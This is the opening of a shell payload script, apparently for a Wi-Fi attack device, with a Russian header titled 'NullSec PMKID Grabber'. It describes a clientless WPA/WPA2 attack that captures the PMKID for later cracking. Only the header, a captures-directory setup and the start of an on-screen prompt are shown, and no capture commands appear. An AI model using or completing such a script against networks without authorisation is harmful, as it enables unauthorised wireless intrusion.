...
# Title: Захватчик PMKID NullSec
# Author: bad-antics
# Description: Атака WPA/WPA2 без клиента используя PMKID из первого сообщения EAPOL
# Category: nullsec

LOOT_DIR="/mmc/nullsec/captures"
mkdir -p "$LOOT_DIR"

PROMPT "ЗАХВАТЧИК PMKID
━━━━━━━━━━━━━━━━━━━━━━━━━
Атака WPA без клиента.
Захватывает PMKID от AP
